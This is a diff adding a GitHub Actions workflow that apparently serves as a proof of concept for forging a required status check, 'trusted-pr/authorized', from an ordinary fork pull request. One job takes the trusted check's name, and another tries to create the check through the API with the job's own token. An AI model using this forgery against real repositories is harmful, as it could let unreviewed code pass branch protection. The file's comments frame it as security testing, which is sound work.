@@ -1,0 +1,44 @@
+# FORK-ONLY. Must never be committed to squnk-works/fred.
+# Trusted PR PoC: tries to produce a check named exactly `trusted-pr/authorized` using only
+# ordinary `pull_request` execution available to any external contributor.
+# No secrets, OIDC, pull_request_target, workflow_run, or external actions.
+name: zz-forge
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  # Forgery: the job name is the required check name. VARIANT A: `true` (runs, success). VARIANT B: change to `false` (skipped).
+  forge:
+    if: ${{ true }}
+    name: trusted-pr/authorized
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Produce forged check
+        run: echo "fork-controlled job; no credentials and no privileged API used"
+
+  # M5: try to create the check through the API with this job's own token. Expected: 403. Output is the HTTP status only.
+  m5-api-attempt:
+    name: m5-api-attempt
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    permissions:
+      checks: write
+      contents: read
+    steps:
+      - name: POST check-runs to the base repo with GITHUB_TOKEN
+        env:
+          GH_TOKEN: ${{ github.token }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+        run: |
+          code=$(curl -sS -o /tmp/m5.json -w '%{http_code}' -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/squnk-works/fred/check-runs \
+            -d "{\"name\":\"trusted-pr/authorized\",\"head_sha\":\"$HEAD_SHA\",\"status\":\"completed\",\"conclusion\":\"success\"}") || true
+          echo "M5 http_status=$code"
+          sed -n 's/.*"message": *"\([^"]*\)".*/M5 message=\1/p' /tmp/m5.json | head -n1
